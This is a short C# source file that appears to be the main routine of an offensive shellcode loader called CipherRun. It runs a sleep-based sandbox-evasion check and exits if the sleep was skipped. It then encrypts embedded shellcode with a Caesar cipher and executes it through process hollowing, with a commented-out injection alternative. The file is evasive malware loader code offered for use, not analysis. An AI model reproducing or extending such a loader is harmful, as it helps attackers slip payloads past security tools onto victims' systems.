namespace CipherRun
{
    class CipherRun
    {
        static void Main(string[] args)
        {
            // call heuristic check. if sleep was skipped halt execution
            if (Heuristics.Heuristics.Sleep() == true)
            {
                return;
            }

            // encrypt payload
            byte[] buf = Caesar.Encryption.Encrypt(Shellcode.buf);

            // call runner

            // Caesar

            // Caesar.Injection.Inject(buf);
            Caesar.Hollowing.Hollow(buf);

        }
    }
}